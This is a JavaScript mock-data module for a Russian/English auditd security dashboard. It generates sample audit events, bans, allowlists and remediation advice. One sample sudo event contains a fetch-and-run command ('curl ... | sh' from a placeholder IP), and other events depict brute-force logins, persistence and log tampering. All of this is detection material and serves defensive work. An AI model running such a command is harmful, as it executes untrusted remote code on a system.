/* Demo data for the auditdsec panel. Loaded only when the page is opened with
   ?mock=1 or straight from disk, and deliberately left out of the embedded
   asset set, so a running agent never serves it.
   Demo sign-in: login "admin", password "demo". */
window.AUDITDSEC_MOCK = (function () {
  "use strict";

  var HOST = "nl-2-12489";
  var ATTACKER = "203.0.113.7";
  var SECOND = "198.51.100.77";
  var OFFICE = "198.51.100.5";

  function raw(type, serial, body) {
    return "type=" + type + " msg=audit(" + (1760000000 + serial) + "." + (100 + serial % 800) +
      ":" + (800 + serial) + "): " + body;
  }

  /* kind, severity, user, ip, russian summary, english summary, raw tail, args */
  var BANK = [
    ["ssh_login_ok", "info", "ruslan", OFFICE,
      "Вход: ruslan с " + OFFICE, "Login: ruslan from " + OFFICE,
      "pid=1442 uid=0 msg='op=PAM:session_open acct=\"ruslan\" exe=\"/usr/sbin/sshd\" addr=" + OFFICE + " terminal=ssh res=success'",
      { user: "ruslan", ip: OFFICE }],
    ["sudo", "info", "ruslan", "",
      "ruslan выполнил команду с правами root: apt-get upgrade -y",
      "ruslan ran a command with elevated rights: apt-get upgrade -y",
      "pid=2210 uid=1000 auid=1000 msg='cwd=\"/home/ruslan\" cmd=\"apt-get upgrade -y\" terminal=pts/0 res=success'",
      { user: "ruslan", cmd: "apt-get upgrade -y" }],
    ["ssh_login_ok", "info", "ruslan", OFFICE,
      "Вход: ruslan с " + OFFICE, "Login: ruslan from " + OFFICE,
      "pid=3301 uid=0 msg='op=PAM:session_open acct=\"ruslan\" addr=" + OFFICE + " terminal=ssh res=success'",
      { user: "ruslan", ip: OFFICE }],
    ["sudo", "warn", "deploy", "",
      "deploy выполнил команду с правами root: curl -s http://198.51.100.9/i.sh | sh",
      "deploy ran a command with elevated rights: curl -s http://198.51.100.9/i.sh | sh",
      "pid=4410 uid=1001 auid=1001 msg='cwd=\"/tmp\" cmd=\"curl -s http://198.51.100.9/i.sh | sh\" terminal=pts/1 res=success'",
      { user: "deploy", cmd: "curl -s http://198.51.100.9/i.sh | sh" }],
    ["ssh_login_fail", "warn", "root", ATTACKER,
      "Неудачная попытка входа: root с " + ATTACKER, "Failed login attempt: root from " + ATTACKER,
      "pid=5502 uid=0 msg='op=PAM:authentication acct=\"root\" exe=\"/usr/sbin/sshd\" addr=" + ATTACKER + " terminal=ssh res=failed'",
      { user: "root", ip: ATTACKER }],
    ["ssh_login_fail", "warn", "admin", ATTACKER,
      "Неудачная попытка входа: admin с " + ATTACKER, "Failed login attempt: admin from " + ATTACKER,
      "pid=5503 uid=0 msg='op=PAM:authentication acct=\"admin\" addr=" + ATTACKER + " terminal=ssh res=failed'",
      { user: "admin", ip: ATTACKER }],
    ["ssh_login_fail", "warn", "postgres", SECOND,
      "Неудачная попытка входа: postgres с " + SECOND, "Failed login attempt: postgres from " + SECOND,
      "pid=5504 uid=0 msg='op=PAM:authentication acct=\"postgres\" addr=" + SECOND + " terminal=ssh res=failed'",
      { user: "postgres", ip: SECOND }],
    ["config_change", "warn", "root", "",
      "Изменён файл конфигурации /etc/ssh/sshd_config, пользователь root",
      "Configuration file /etc/ssh/sshd_config changed by root",
      "pid=6601 uid=0 auid=0 key=\"ads_sshd\" name=\"/etc/ssh/sshd_config\" nametype=NORMAL",
      { path: "/etc/ssh/sshd_config", user: "root", key: "ads_sshd" }],
    ["suspicious_exec", "warn", "www-data", "",
      "Запущена программа из временного каталога: /tmp/.x/kworker, пользователь www-data",
      "Program executed from a temporary directory: /tmp/.x/kworker, user www-data",
      "pid=7702 uid=33 auid=4294967295 key=\"ads_exec_tmp\" exe=\"/tmp/.x/kworker\" success=yes",
      { path: "/tmp/.x/kworker", user: "www-data" }],
    ["user_change", "warn", "root", "",
      "Изменение учётных записей: добавлен пользователь svc-backup",
      "Account change: user svc-backup added",
      "pid=8801 uid=0 auid=0 msg='op=add-user id=1003 exe=\"/usr/sbin/useradd\" res=success'",
      { user: "root", detail: "useradd svc-backup" }],
    ["login_after_bruteforce", "critical", "root", ATTACKER,
      "Успешный вход root с " + ATTACKER + " после 14 неудачных попыток",
      "Successful login by root from " + ATTACKER + " after 14 failed attempts",
      "pid=9901 uid=0 msg='op=PAM:session_open acct=\"root\" addr=" + ATTACKER + " terminal=ssh res=success'",
      { user: "root", ip: ATTACKER, fails: "14" }],
    ["authorized_keys_change", "critical", "root", "",
      "Изменён файл SSH-ключей /root/.ssh/authorized_keys, пользователь root",
      "SSH key file /root/.ssh/authorized_keys changed by root",
      "pid=10011 uid=0 auid=0 key=\"ads_sshkeys\" name=\"/root/.ssh/authorized_keys\" nametype=NORMAL",
      { path: "/root/.ssh/authorized_keys", user: "root" }],
    ["persistence", "critical", "root", "",
      "Изменён объект автозапуска /etc/cron.d/sysupdate, пользователь root",
      "Startup object /etc/cron.d/sysupdate changed by root",
      "pid=10112 uid=0 auid=0 key=\"ads_persist\" name=\"/etc/cron.d/sysupdate\" nametype=CREATE",
      { path: "/etc/cron.d/sysupdate", user: "root" }],
    ["log_tamper", "critical", "root", "",
      "Вмешательство в журналы или правила аудита: очищен /var/log/wtmp, пользователь root",
      "Logs or audit rules tampered with: /var/log/wtmp truncated, user root",
      "pid=10213 uid=0 auid=0 key=\"ads_logs\" name=\"/var/log/wtmp\" nametype=NORMAL",
      { detail: "/var/log/wtmp", user: "root" }],
    ["user_change", "critical", "root", "",
      "Изменение учётных записей: svc-backup добавлен в группу sudo",
      "Account change: svc-backup added to the sudo group",
      "pid=10314 uid=0 auid=0 msg='op=add-user-to-group grp=\"sudo\" acct=\"svc-backup\" res=success'",
      { user: "root", detail: "usermod -aG sudo svc-backup" }],
    ["auditd_stopped", "critical", "", "",
      "Служба аудита недоступна: журнал не обновлялся 11 минут",
      "Audit service unavailable: the log has not been written for 11 minutes",
      "pid=1 uid=0 auid=4294967295 msg='op=stop reason=shutdown res=success'",
      { detail: "stale 11m" }]
  ];

  var EXPLAIN = {
    ru: {
      ssh_login_ok: ["Кто-то успешно вошёл на сервер.", "Обычное событие, но вход root или вход с незнакомого адреса стоит проверить — особенно сразу после серии неудачных попыток.", "Если это были не вы, смените пароли и SSH-ключи, посмотрите ~/.ssh/authorized_keys и активные сессии командой who."],
      ssh_login_fail: ["Попытка входа с неверными данными.", "Единичные промахи нормальны. Десятки в минуту означают подбор пароля.", "Забаньте адрес кнопкой под сообщением, затем отключите вход по паролю (PasswordAuthentication no) и оставьте только ключи."],
      login_after_bruteforce: ["Серия неудачных входов с одного адреса, а затем удачный вход.", "Максимальная. Так выглядит угаданный пароль, то есть сервер, скорее всего, уже не ваш.", "Проверьте активные сессии (who, ss -tnp), смените пароли и ключи, просмотрите authorized_keys, cron и systemd-юниты, отключите вход по паролю."],
      sudo: ["Пользователь выполнил команду от root через sudo или su.", "Обычное администрирование. Тревожно, если пользователь не должен этого делать или команда качает и запускает код из интернета.", "Посмотрите команду и пользователя. Если это были не вы, считайте учётную запись скомпрометированной."],
      user_change: ["Созданы, удалены или изменены учётные записи, группы или права sudo.", "Высокая. Скрытая учётная запись — классический способ сохранить доступ к серверу.", "Просмотрите список пользователей (getent passwd) и /etc/sudoers, удалите всё неожиданное."],
      authorized_keys_change: ["Изменён файл authorized_keys, который даёт вход по SSH без пароля.", "Очень высокая. Со своим ключом злоумышленник вернётся когда захочет, даже после смены пароля.", "Откройте файл, удалите незнакомые ключи, затем выясните, кто и когда их добавил."],
      persistence: ["Изменены задания cron, systemd-юниты или файлы автозапуска оболочки.", "Высокая. Так вредоносный код переживает перезагрузку.", "Прочитайте изменённый файл, проверьте crontab -l у всех пользователей и systemctl list-timers."],
      config_change: ["Изменён конфигурационный файл службы, например sshd_config.", "Средняя. В конфигурации включают вход root, разрешают пароли и добавляют туннели.", "Сравните файл с ожидаемым состоянием и перезапустите службу, если изменение было нежелательным."],
      log_tamper: ["Изменены журналы или правила аудита, либо загружен модуль ядра.", "Очень высокая. Это заметание следов, после которого журналам нельзя доверять.", "Сохраните копию журналов, проверьте систему с внешнего носителя и считайте сервер скомпрометированным, пока не доказано обратное."],
      suspicious_exec: ["Программа запущена из /tmp, /dev/shm или /var/tmp.", "Высокая. Обычные службы оттуда не работают, а загрузчики и майнеры — да.", "Посмотрите файл и процесс; при сомнениях завершите процесс и удалите файл."],
      auditd_stopped: ["Служба аудита не пишет события или остановлена.", "Высокая. Пока аудит выключен, вы не видите, что происходит на сервере.", "Проверьте systemctl status auditd и запустите службу. Если останавливали не вы, выясните, кто это сделал."]
    },
    en: {
      ssh_login_ok: ["Somebody logged in successfully.", "A login is ordinary, but a root login or one from an unfamiliar address deserves a look, especially right after a burst of failures.", "If it was not you, rotate passwords and SSH keys now, inspect ~/.ssh/authorized_keys and check live sessions with who."],
      ssh_login_fail: ["A login attempt with wrong credentials.", "Isolated misses are normal. Dozens per minute mean a brute-force attack.", "Ban the address with the button under the message, then disable password logins (PasswordAuthentication no) and keep keys only."],
      login_after_bruteforce: ["A burst of failed logins from one address, and then a login that worked.", "As high as it gets. This is what a guessed password looks like, so the server is probably no longer yours.", "Check live sessions now (who, ss -tnp), rotate passwords and SSH keys, inspect authorized_keys, cron and systemd units, and disable password logins."],
      sudo: ["A user ran a command as root through sudo or su.", "Routine administration. Worrying when the user should not be doing it, or when the command downloads and runs code from the internet.", "Check the command and the user. If it was not you, treat that account as compromised."],
      user_change: ["Accounts, groups or sudo rights were created, removed or modified.", "High. A hidden account is a classic way to keep access to a server.", "Review the user list (getent passwd) and /etc/sudoers, and delete anything unexpected."],
      authorized_keys_change: ["The authorized_keys file that grants password-less SSH access was changed.", "Very high. With their own key in place, an attacker returns whenever they like, even after a password change.", "Open the file, remove unknown keys, then find out who added them and when."],
      persistence: ["Cron jobs, systemd units or shell startup files were changed.", "High. This is how malicious code survives a reboot.", "Read the changed file, check crontab -l for every user and systemctl list-timers."],
      config_change: ["A service configuration file such as sshd_config was changed.", "Medium. Configuration is where root logins get enabled, passwords get allowed and tunnels get added.", "Compare the file with its expected state and restart the service if the change was unwanted."],
      log_tamper: ["Logs or audit rules were modified, or a kernel module was loaded.", "Very high. This is track covering, and afterwards the logs cannot be trusted.", "Preserve a copy of the logs, inspect the system from external media and treat the server as compromised until proven otherwise."],
      suspicious_exec: ["A program was executed from /tmp, /dev/shm or /var/tmp.", "High. Normal services do not run from there, but loaders and miners do.", "Inspect the file and the process; when in doubt kill the process and delete the file."],
      auditd_stopped: ["The audit service is not writing events, or has stopped.", "High. While auditing is off you cannot see what happens on the server.", "Check systemctl status auditd and start the service. If you did not stop it, find out who did."]
    }
  };

  var SEV_ALLOWED = {
    quiet: { info: true },
    warn: { info: true, warn: true },
    alert: { info: true, warn: true, critical: true },
    degraded: { info: true, warn: true, critical: true }
  };

  var scenario = "alert";
  var db = null;

  function lang() {
    return window.ADS && window.ADS.state ? window.ADS.state.lang : "ru";
  }

  function build() {
    var allowed = SEV_ALLOWED[scenario] || SEV_ALLOWED.alert;
    var bank = BANK.filter(function (row) {
      if (!allowed[row[1]]) { return false; }
      return row[0] !== "auditd_stopped" || scenario === "degraded";
    });
    var now = Date.now();
    var events = [];
    var total = 46;
    for (var i = 0; i < total; i++) {
      var row = bank[i % bank.length];
      var minutes = Math.round(i * 24 + (i % 7) * 3 + (i % 3));
      var at = new Date(now - minutes * 60000);
      events.push({
        id: "evt_" + (1000 + i),
        time: at.toISOString(),
        host: HOST,
        kind: row[0],
        severity: row[1],
        user: row[2],
        src_ip: row[3],
        summary: lang() === "ru" ? row[4] : row[5],
        args: row[7],
        raw: raw(row[0] === "sudo" ? "USER_CMD" : row[0] === "ssh_login_fail" ? "USER_AUTH" : "SYSCALL", i, row[6])
      });
    }
    /* A burst, so the brute-force story in the feed is visible. */
    if (allowed.warn) {
      for (var b = 0; b < 12; b++) {
        events.push({
          id: "evt_burst_" + b,
          time: new Date(now - (31 + b) * 60000).toISOString(),
          host: HOST,
          kind: "ssh_login_fail",
          severity: "warn",
          user: ["root", "admin", "oracle", "test", "ubuntu"][b % 5],
          src_ip: ATTACKER,
          summary: (lang() === "ru" ? "Неудачная попытка входа: " : "Failed login attempt: ") +
            ["root", "admin", "oracle", "test", "ubuntu"][b % 5] + (lang() === "ru" ? " с " : " from ") + ATTACKER,
          args: { user: ["root", "admin", "oracle", "test", "ubuntu"][b % 5], ip: ATTACKER },
          raw: raw("USER_AUTH", 300 + b, "pid=" + (5600 + b) + " uid=0 msg='op=PAM:authentication acct=\"" +
            ["root", "admin", "oracle", "test", "ubuntu"][b % 5] + "\" addr=" + ATTACKER + " terminal=ssh res=failed'")
        });
      }
    }
    events.sort(function (x, y) { return x.time < y.time ? 1 : -1; });

    var enforcing = scenario !== "degraded";
    var bans = [
      {
        ip: ATTACKER,
        reason: lang() === "ru" ? "перебор пароля: 14 попыток за 10 мин" : "brute force: 14 attempts in 10 min",
        created: new Date(now - 26 * 60000).toISOString(),
        until: new Date(now + 23 * 3600000).toISOString(),
        permanent: false, repeat_count: 2, applied: enforcing, source: "auto"
      },
      {
        ip: SECOND,
        reason: lang() === "ru" ? "перебор пароля: 10 попыток за 7 мин" : "brute force: 10 attempts in 7 min",
        created: new Date(now - 5 * 3600000).toISOString(),
        until: new Date(now + 40 * 60000).toISOString(),
        permanent: false, repeat_count: 1, applied: false, source: "auto"
      },
      {
        ip: "192.0.2.44",
        reason: lang() === "ru" ? "блокировка вручную" : "manual block",
        created: new Date(now - 32 * 3600000).toISOString(),
        until: null, permanent: true, repeat_count: 4, applied: enforcing, source: "manual"
      }
    ];
    if (scenario === "quiet") { bans = bans.slice(2); }

    db = {
      lang: lang(),
      events: events,
      bans: bans,
      allowlist: [
        { ip: OFFICE, added: new Date(now - 36 * 3600000).toISOString(), source: "first_login" },
        { ip: "192.0.2.8", added: new Date(now - 9 * 3600000).toISOString(), source: "manual" }
      ],
      muted_until: null,
      enforcing: enforcing,
      healthy: scenario !== "degraded",
      lastWrite: new Date(now - (scenario === "degraded" ? 11 * 60000 : 9000)).toISOString()
    };
    return db;
  }

  /* The demo summaries are pre-rendered per language, so a language switch
     rebuilds the set rather than showing half-translated rows. */
  function data() {
    if (!db || db.lang !== lang()) { return build(); }
    return db;
  }

  function within24h(ev) { return Date.now() - new Date(ev.time).getTime() <= 86400000; }

  function status() {
    var d = data();
    var day = d.events.filter(within24h);
    function count(sev) { return day.filter(function (e) { return e.severity === sev; }).length; }
    var hourly = [];
    var top = new Date();
    top.setMinutes(0, 0, 0);
    for (var i = 23; i >= 0; i--) {
      var from = top.getTime() - i * 3600000;
      var slot = { hour: new Date(from).toISOString(), info: 0, warn: 0, critical: 0 };
      day.forEach(function (e) {
        var at = new Date(e.time).getTime();
        if (at >= from && at < from + 3600000) {
          slot[e.severity === "critical" ? "critical" : e.severity] += 1;
        }
      });
      hourly.push(slot);
    }
    var byKind = {};
    day.forEach(function (e) { byKind[e.kind] = (byKind[e.kind] || 0) + 1; });
    return {
      host: HOST,
      profile: "simple",
      version: "0.3.0-dev",
      uptime_seconds: 132000,
      lang: lang(),
      debug: false,
      log_level: "info",
      ban: { backend: d.enforcing ? "nftables" : "none", dry_run: false, enforcing: d.enforcing },
      muted_until: d.muted_until,
      auditd: { healthy: d.healthy, last_write: d.lastWrite },
      counters: {
        events_24h: day.length,
        critical_24h: count("critical"),
        warn_24h: count("warn"),
        events_total: d.events.length + 1840,
        alerts_sent: 37,
        lines_skipped: 2140,
        rate_limited: 0
      },
      bans_active: d.bans.length,
      allowlist_count: d.allowlist.length,
      last_event_time: d.events.length ? d.events[0].time : null,
      rules_loaded: true,
      by_kind: byKind,
      hourly: hourly
    };
  }

  function events(q) {
    var d = data();
    var list = d.events.filter(function (e) {
      if (q.severity && e.severity !== q.severity) { return false; }
      if (q.kind && e.kind !== q.kind) { return false; }
      if (q.ip && (e.src_ip || "").indexOf(q.ip) < 0) { return false; }
      if (q.user && (e.user || "").indexOf(q.user) < 0) { return false; }
      if (q.since && new Date(e.time).getTime() < new Date(q.since).getTime()) { return false; }
      if (q.q) {
        var needle = q.q.toLowerCase();
        var hay = [e.summary, e.user, e.src_ip, e.raw].join(" ").toLowerCase();
        if (hay.indexOf(needle) < 0) { return false; }
      }
      return true;
    });
    var start = 0;
    if (q.before) {
      for (var i = 0; i < list.length; i++) {
        if (list[i].id === q.before) { start = i + 1; break; }
      }
    }
    var limit = Math.min(200, Math.max(1, Number(q.limit) || 50));
    var page = list.slice(start, start + limit);
    return {
      items: page,
      next: start + limit < list.length && page.length ? page[page.length - 1].id : null
    };
  }

  function config() {
    var d = data();
    return {
      host: HOST,
      profile: "simple",
      lang: lang(),
      debug: false,
      audit_log: "/var/log/audit/audit.log",
      state_dir: "/var/lib/auditdsec",
      telegram: {
        token: "***",
        chat_ids: [123456789],
        min_severity: "warn",
        quiet_hours: "23:00-07:00",
        dedup_window: "10m",
        rate_per_minute: 10,
        retention_days: 14
      },
      detect: { enabled: true, window: "10m", fail_threshold: 10, success_after_failures: 5 },
      ban: { backend: d.enforcing ? "nftables" : "none", dry_run: false, table: "auditdsec", auto_allowlist: "first_login" },
      heartbeat: { enabled: true, stale_after: "10m" },
      log: { file: "/var/log/auditdsec/agent.log", level: "info", max_size_mb: 10, keep: 3 }
    };
  }

  function diagnostics() {
    var s = status();
    return {
      debug: false,
      log_level: "info",
      counters: s.counters,
      audit_log: "/var/log/audit/audit.log",
      offset: 48219104,
      detector: "bruteforce",
      banner: s.ban.backend,
      bans_recorded: data().bans.length
    };
  }

  function fail_(code, message) {
    var e = new Error(message);
    e.code = code;
    return e;
  }
  function reject(code, message) { return Promise.reject(fail_(code, message)); }

  function parse(path) {
    var at = path.indexOf("?");
    var query = {};
    if (at >= 0) {
      new URLSearchParams(path.slice(at + 1)).forEach(function (v, k) { query[k] = v; });
      path = path.slice(0, at);
    }
    return { path: path, query: query };
  }

  function handle(method, rawPath, body) {
    var req = parse(rawPath);
    var path = req.path;
    var d = data();
    var result;

    if (method === "POST" && path === "/login") {
      if (body && body.login === "admin" && body.password === "demo") {
        return new Promise(function (resolve) { setTimeout(function () { resolve({ token: "demo-token" }); }, 260); });
      }
      return new Promise(function (resolve, reject) {
        setTimeout(function () { reject(fail_("bad_credentials", "wrong login or password")); }, 260);
      });
    }

    if (method === "GET") {
      if (path === "/status") { result = status(); }
      else if (path === "/events") { result = events(req.query); }
      else if (path.indexOf("/explain/") === 0) {
        var kind = path.slice("/explain/".length);
        var table = EXPLAIN[req.query.lang === "en" ? "en" : "ru"][kind];
        result = table ? { kind: kind, what: table[0], risk: table[1], todo: table[2] } : { kind: kind };
      }
      else if (path === "/bans") { result = d.bans.slice(); }
      else if (path === "/allowlist") { result = d.allowlist.slice(); }
      else if (path === "/config") { result = config(); }
      else if (path === "/diagnostics") { result = diagnostics(); }
    } else if (method === "POST") {
      if (path === "/bans") {
        var ip = String((body && body.ip) || "");
        if (d.allowlist.some(function (a) { return a.ip === ip; })) {
          return reject("allowlisted", "address is allowlisted");
        }
        var hours = { "1h": 1, "24h": 24, "30d": 720 }[(body && body.duration) || "24h"];
        var permanent = (body && body.duration) === "permanent";
        d.bans = d.bans.filter(function (b) { return b.ip !== ip; });
        d.bans.unshift({
          ip: ip, reason: (body && body.reason) || "manual",
          created: new Date().toISOString(),
          until: permanent ? null : new Date(Date.now() + hours * 3600000).toISOString(),
          permanent: permanent, repeat_count: 1, applied: d.enforcing, source: "manual"
        });
        result = d.bans[0];
      } else if (path === "/allowlist") {
        var allow = String((body && body.ip) || "");
        if (!d.allowlist.some(function (a) { return a.ip === allow; })) {
          d.allowlist.unshift({ ip: allow, added: new Date().toISOString(), source: "manual" });
        }
        d.bans = d.bans.filter(function (b) { return b.ip !== allow; });
        result = { ip: allow };
      } else if (path === "/mute") {
        var h = Number((body && body.hours) || 24);
        d.muted_until = new Date(Date.now() + h * 3600000).toISOString();
        result = { muted_until: d.muted_until };
      }
    } else if (method === "DELETE") {
      if (path.indexOf("/bans/") === 0) {
        var gone = decodeURIComponent(path.slice("/bans/".length));
        d.bans = d.bans.filter(function (b) { return b.ip !== gone; });
        result = null;
      } else if (path.indexOf("/allowlist/") === 0) {
        var drop = decodeURIComponent(path.slice("/allowlist/".length));
        d.allowlist = d.allowlist.filter(function (a) { return a.ip !== drop; });
        result = null;
      } else if (path === "/mute") {
        d.muted_until = null;
        result = null;
      }
    }

    if (result === undefined) { return reject("not_found", method + " " + path); }
    return new Promise(function (resolve) {
      setTimeout(function () { resolve(result); }, 140);
    });
  }

  return {
    scenario: scenario,
    setScenario: function (name) {
      if (!SEV_ALLOWED[name]) { return; }
      scenario = name;
      this.scenario = name;
      db = null;
      build();
    },
    handle: handle,
    rebuild: function () { db = null; build(); }
  };
})();
